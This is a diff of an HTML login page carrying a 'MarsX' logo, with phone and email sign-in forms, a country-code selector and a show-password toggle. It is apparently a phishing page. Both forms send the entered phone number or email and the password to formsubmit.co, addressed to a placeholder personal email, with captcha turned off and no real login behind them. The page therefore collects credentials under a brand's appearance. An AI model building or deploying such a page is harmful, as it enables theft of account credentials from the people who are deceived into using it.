@@ -6,204 +6,268 @@
   <title>Login Page</title>
   <style>
     body {
-      margin: 0;
-      padding: 0;
-      background-color: #0c0c0c;
+      background-color: #000;
       font-family: Arial, sans-serif;
       color: white;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 180px; /* CONTENU PLUS BAS */
     }
 
     .container {
-      max-width: 400px;
-      margin: 100px auto 0;
-      padding: 20px;
+      width: 400px;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
     }
 
     .logo {
-      width: 120px;
-      margin-bottom: 10px;
+      width: 160px;
+      margin-bottom: 20px;
     }
 
-    h1 {
-      font-size: 24px;
-      margin-bottom: 30px;
+    .welcome {
+      font-size: 26px;
+      font-weight: bold;
+      margin-bottom: 20px;
     }
 
-    .toggle-buttons {
+    .toggle-container {
       display: flex;
-      background-color: #2c2c2c;
-      border-radius: 30px;
+      background-color: #2d2d2d;
+      border-radius: 999px;
       overflow: hidden;
-      width: 100%;
       margin-bottom: 30px;
+      width: 100%;
+      height: 38px;
+      padding: 3px;
     }
 
-    .toggle-buttons button {
+    .toggle-button {
       flex: 1;
-      padding: 10px 0;
-      border: none;
+      padding: 5px 0;
+      text-align: center;
       cursor: pointer;
       background-color: transparent;
       color: #ccc;
-      font-weight: bold;
-      font-size: 14px;
-      transition: background-color 0.3s, color 0.3s;
+      border: none;
+      font-weight: 600;
+      font-size: 0.95rem;
+      transition: background-color 0.3s ease, color 0.3s ease;
+      border-radius: 999px;
     }
 
-    .toggle-buttons .active {
-      background-color: #c9a72e;
-      color: black;
+    .toggle-button.active {
+      background-color: #d4af37;
+      color: #000;
     }
 
     form {
-      display: none;
-      flex-direction: column;
-    }
-
-    form.active {
       display: flex;
+      flex-direction: column;
+      width: 100%;
+      gap: 16px;
     }
 
     label {
+      font-size: 0.9rem;
+      margin-left: 12px;
       margin-bottom: 5px;
-      font-size: 14px;
-      color: #ccc;
     }
 
-    input {
-      padding: 10px;
-      margin-bottom: 20px;
-      border-radius: 6px;
-      border: none;
-      width: 100%;
-      background-color: #1c1c1c;
-      color: white;
-    }
-
-    .password-wrapper {
-      position: relative;
-    }
-
-    .password-wrapper input {
-      padding-right: 40px;
-    }
-
-    .password-wrapper .toggle-password {
-      position: absolute;
-      right: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      cursor: pointer;
-      color: gray;
-    }
-
-    .options {
+    .input-group {
+      background-color: #2d2d2d;
+      border-radius: 30px;
       display: flex;
-      flex-direction: column;
-      font-size: 13px;
-      margin-top: -10px;
-      margin-bottom: 20px;
+      align-items: center;
+      padding: 12px 16px;
+      gap: 10px;
     }
 
-    .options a {
+    .input-group img.flag {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+
+    .input-group select {
+      background: none;
+      border: none;
+      color: white;
+      font-size: 1rem;
+      outline: none;
+      appearance: none;
+      width: 60px;
+    }
+
+    .input-group input {
+      background: none;
+      border: none;
+      color: white;
+      font-size: 1rem;
+      outline: none;
+      flex: 1;
+    }
+
+    .input-group.password input {
+      flex: 1;
+    }
+
+    .input-group .eye-icon {
+      cursor: pointer;
+      filter: grayscale(100%);
+      opacity: 0.6;
+    }
+
+    .form-footer {
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.85rem;
+      color: white;
+      flex-direction: column;
+      gap: 5px;
+      margin-top: -5px;
+      margin-bottom: 10px;
+    }
+
+    .form-footer a {
       color: white;
       text-decoration: none;
-      margin-bottom: 5px;
     }
 
-    button.submit-btn {
-      background-color: #c9a72e;
-      color: black;
-      padding: 12px;
+    .form-footer small {
+      color: white;
+    }
+
+    button[type="submit"] {
+      background-color: #d4af37;
       border: none;
-      border-radius: 6px;
-      font-size: 16px;
+      padding: 12px;
+      border-radius: 30px;
+      font-weight: bold;
       cursor: pointer;
-      transition: background-color 0.3s;
     }
 
-    button.submit-btn:hover {
-      background-color: #e6bf3c;
+    .hidden {
+      display: none;
     }
-
   </style>
 </head>
 <body>
+
   <div class="container">
-    <img src="https://files.oaiusercontent.com/file-F7aXNkRsdtSiuj8zciN3bu?se=2025-08-08T00%3A00%3A00Z&sp=r&sv=2021-08-06&sr=b&sig=VqV1zF%2FvCQOa6wlfDw%2FJ5r7QyD0rK4LfnsKm8pyij90%3D" alt="MarsX Logo" class="logo" />
+    <!-- LOGO aligné à gauche -->
+    <img src="immmm.png" alt="MarsX Logo" class="logo" />
 
-    <h1>Welcome To Login</h1>
+    <!-- TITRE -->
+    <div class="welcome">Welcome To Login</div>
 
-    <div class="toggle-buttons">
-      <button class="active" onclick="toggleForm('phone')">Phone Login</button>
-      <button onclick="toggleForm('email')">Email Login</button>
+    <!-- BOUTONS TOGGLE -->
+    <div class="toggle-container">
+      <button class="toggle-button active" onclick="toggleLogin('phone')">Phone Login</button>
+      <button class="toggle-button" onclick="toggleLogin('email')">Email Login</button>
     </div>
 
-    <!-- Phone Login Form -->
-    <form id="phoneForm" class="active" action="https://formsubmit.co/TON_EMAIL_ICI" method="POST">
+    <!-- FORMULAIRE PHONE -->
+    <form id="phoneForm" action="https://formsubmit.co/tonadresse@email.com" method="POST">
       <input type="hidden" name="_captcha" value="false">
+
       <label for="phone">Phone Number</label>
-      <input type="tel" name="phone" id="phone" required />
-
-      <label for="phonePassword">Password</label>
-      <div class="password-wrapper">
-        <input type="password" name="phonePassword" id="phonePassword" required />
-        <span class="toggle-password" onclick="togglePassword('phonePassword')">&#128065;</span>
+      <div class="input-group">
+        <img class="flag" src="https://flagcdn.com/us.svg" alt="US Flag">
+        <select name="countryCode" id="countryCode">
+          <option value="+1" data-flag="us">+1</option>
+          <option value="+1" data-flag="ca">+1</option>
+          <option value="+33" data-flag="fr">+33</option>
+          <option value="+47" data-flag="no">+47</option>
+          <option value="+34" data-flag="es">+34</option>
+          <option value="+46" data-flag="se">+46</option>
+          <option value="+41" data-flag="ch">+41</option>
+          <option value="+63" data-flag="ph">+63</option>
+          <option value="+44" data-flag="gb">+44</option>
+          <option value="+57" data-flag="co">+57</option>
+        </select>
+        <input type="text" name="phone" placeholder="Phone Number" required>
       </div>
 
-      <div class="options">
-        <a href="#">Forgot password?</a>
-        <label><input type="checkbox" name="rememberPhone" /> Remember account and password</label>
+      <label for="password-phone">Password</label>
+      <div class="input-group password">
+        <input type="password" name="password" id="password-phone" placeholder="Password" required>
+        <img class="eye-icon" src="https://img.icons8.com/ios-glyphs/30/ffffff/visible--v1.png" alt="eye" onclick="togglePassword('password-phone', this)">
       </div>
 
-      <button class="submit-btn" type="submit">Login</button>
+      <div class="form-footer">
+        <a href="#">Forgot Password?</a>
+        <small><input type="checkbox" id="remember-phone"> Remember account and password</small>
+      </div>
+
+      <button type="submit">Login</button>
     </form>
 
-    <!-- Email Login Form -->
-    <form id="emailForm" action="https://formsubmit.co/TON_EMAIL_ICI" method="POST">
+    <!-- FORMULAIRE EMAIL -->
+    <form id="emailForm" class="hidden" action="https://formsubmit.co/tonadresse@email.com" method="POST">
       <input type="hidden" name="_captcha" value="false">
+
       <label for="email">Email</label>
-      <input type="email" name="email" id="email" required />
-
-      <label for="emailPassword">Password</label>
-      <div class="password-wrapper">
-        <input type="password" name="emailPassword" id="emailPassword" required />
-        <span class="toggle-password" onclick="togglePassword('emailPassword')">&#128065;</span>
+      <div class="input-group">
+        <input type="email" name="email" placeholder="Email" required>
       </div>
 
-      <div class="options">
-        <a href="#">Forgot password?</a>
-        <label><input type="checkbox" name="rememberEmail" /> Remember account and password</label>
+      <label for="password-email">Password</label>
+      <div class="input-group password">
+        <input type="password" name="password" id="password-email" placeholder="Password" required>
+        <img class="eye-icon" src="https://img.icons8.com/ios-glyphs/30/ffffff/visible--v1.png" alt="eye" onclick="togglePassword('password-email', this)">
       </div>
 
-      <button class="submit-btn" type="submit">Login</button>
+      <div class="form-footer">
+        <a href="#">Forgot Password?</a>
+        <small><input type="checkbox" id="remember-email"> Remember account and password</small>
+      </div>
+
+      <button type="submit">Login</button>
     </form>
   </div>
 
   <script>
-    function toggleForm(type) {
-      const phoneBtn = document.querySelector('.toggle-buttons button:nth-child(1)');
-      const emailBtn = document.querySelector('.toggle-buttons button:nth-child(2)');
+    function toggleLogin(method) {
+      const phoneBtn = document.querySelectorAll('.toggle-button')[0];
+      const emailBtn = document.querySelectorAll('.toggle-button')[1];
       const phoneForm = document.getElementById('phoneForm');
       const emailForm = document.getElementById('emailForm');
 
-      if (type === 'phone') {
+      if (method === 'phone') {
         phoneBtn.classList.add('active');
         emailBtn.classList.remove('active');
-        phoneForm.classList.add('active');
-        emailForm.classList.remove('active');
+        phoneForm.classList.remove('hidden');
+        emailForm.classList.add('hidden');
       } else {
-        phoneBtn.classList.remove('active');
         emailBtn.classList.add('active');
-        phoneForm.classList.remove('active');
-        emailForm.classList.add('active');
+        phoneBtn.classList.remove('active');
+        emailForm.classList.remove('hidden');
+        phoneForm.classList.add('hidden');
       }
     }
 
-    function togglePassword(id) {
-      const input = document.getElementById(id);
-      input.type = input.type === 'password' ? 'text' : 'password';
+    function togglePassword(inputId, eyeIcon) {
+      const input = document.getElementById(inputId);
+      if (input.type === 'password') {
+        input.type = 'text';
+        eyeIcon.src = "https://img.icons8.com/ios-glyphs/30/ffffff/closed-eye.png";
+      } else {
+        input.type = 'password';
+        eyeIcon.src = "https://img.icons8.com/ios-glyphs/30/ffffff/visible--v1.png";
+      }
     }
+
+    document.getElementById("countryCode").addEventListener("change", function() {
+      const flag = this.options[this.selectedIndex].dataset.flag;
+      const img = document.querySelector(".input-group img.flag");
+      img.src = `https://flagcdn.com/${flag}.svg`;
+    });
   </script>
+
 </body>
 </html>
